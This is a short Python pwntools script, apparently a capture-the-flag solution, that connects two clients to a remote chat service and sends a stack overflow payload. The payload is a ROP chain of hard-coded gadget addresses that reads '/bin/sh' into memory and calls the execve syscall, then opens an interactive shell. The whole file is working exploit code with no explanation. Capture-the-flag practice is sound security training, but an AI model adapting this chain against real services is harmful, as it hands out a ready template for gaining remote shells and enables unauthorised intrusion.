from pwn import *

#r1 = process('./chat_client')
#r2 = process('./chat_client')
r1 = remote('rcs.eatpwnnosleep.com', 13137)
r2 = remote('rcs.eatpwnnosleep.com', 13137)

r1.sendlineafter('>>', '1')
r1.sendlineafter('>>', '123')
sleep(1)
r2.sendlineafter('>>', '2')
r2.sendlineafter('>>', '123')

poprdi = 0x00000000004a3eaf
poprsi = 0x000000000049564c
poprdx = 0x00000000004056d7
poprax = 0x000000000048a07a
syscall = 0x00000000004a45f4
bss = 0x6d0f00
read = 0x400cd2

pay = 'a'*(0x110-9) + 'b'*8
pay += p64(poprdi) + p64(bss)
pay += p64(poprsi) + p64(8)
pay += p64(read)
pay += p64(poprdi) + p64(bss)
pay += p64(poprsi) + p64(0)
pay += p64(poprdx) + p64(0)
pay += p64(poprax) + p64(59)
pay += p64(syscall)

r2.sendline(pay)
sleep(2)
r1.sendline('/bye')
sleep(2)
r1.send('/bin/sh\x00')
r1.interactive()
